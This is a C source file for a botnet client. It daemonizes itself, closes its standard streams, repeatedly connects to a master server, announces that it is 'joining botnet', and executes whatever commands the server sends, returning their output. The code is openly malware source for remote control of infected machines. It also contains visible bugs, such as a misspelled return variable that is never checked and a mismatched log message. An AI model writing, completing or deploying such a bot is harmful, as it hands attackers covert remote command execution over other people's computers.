#include "bot.h"

int main(void){
	char output[200];//string to hold return from commands.
	int execute_return = 0;
	//initialize parent id variable.
	pid_t pid;	
	
	pid = fork();
	if(pid < 0){
		exit(EXIT_FAILURE);
	}

	if(pid > 0){
		exit(EXIT_SUCCESS);
	}

	//Change the file mode mask. This is used by system calls
	//that create files to modify the permissions placed on newly created
	//files or directories. 0 gives full access to file generation.
	umask(0);

	//initialize syslog.
	openlog("bot", LOG_PID, LOG_USER);
	syslog(LOG_INFO, "%s\n", "Log is ready.");

	//Create a new SID for the child process.
	pid_t sid = setsid();
	if(sid < 0){
		syslog(LOG_ERR, "%s\n", "New id was not made for child.");
		exit(EXIT_FAILURE);
	}

	//Change current working directory to root.
	if((chdir("/")) < 0){
		syslog(LOG_ERR, "%s\n", "Didnt change current directory.");
		exit(EXIT_FAILURE);
	}

	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	//set name to the name of systems user
	char* name = getenv("USER");
	//main big loop
	while(1){

		//open a socket channel with master server.
		int socket = init_channel(SERVER, PORT, name);

		if(socket > 0){
			char* msg = malloc(CMD_LENGTH);
			syslog(LOG_INFO, "%s %s\n", name, "joining botnet");
			//Add way to exit bot function.
			while(1){
		
				memset(msg, 0, strlen(msg)*sizeof(char)); //reset the msg buffer
				//get message from master using socket channel. Store in msg 
				//string.
				int recv_return = recv(socket, msg, CMD_LENGTH, 0);//recieve message
				//from master
				if(recv_return < 0){
					syslog(LOG_ERR, "%s\n", "Didnt change current directory.");

					printf("reveive failed");

					exit(EXIT_FAILURE);
				}
		
				msg[recv_return] = '\0'; //add null terminator to end of msg.
				int exectute_return = execute(msg, output, socket);
				if(execute_return != 1){
					syslog(LOG_ERR, "%s\n", "Failed to execute command.");
				}//else if(execute_return == -2){
				//	break;//if execute return -2 it means that the master
					//wishes to disconect.
				//}

				//syslog(LOG_INFO, "%s", msg);

				//if(socket <= 0){
				//	break;
				//}

				//printf("%s", msg);
			}	
	
		}else if(socket == -1){
			//socket function failed. keep trying.
			syslog(LOG_ERR, "%s\n", "socket failed");
		}else if(socket == -2){
			//connection failed.
			syslog(LOG_ERR, "%s\n", "connect failed");
		}

		sleep(15); //wait 15 seconds.

	}

	exit(EXIT_SUCCESS);
}
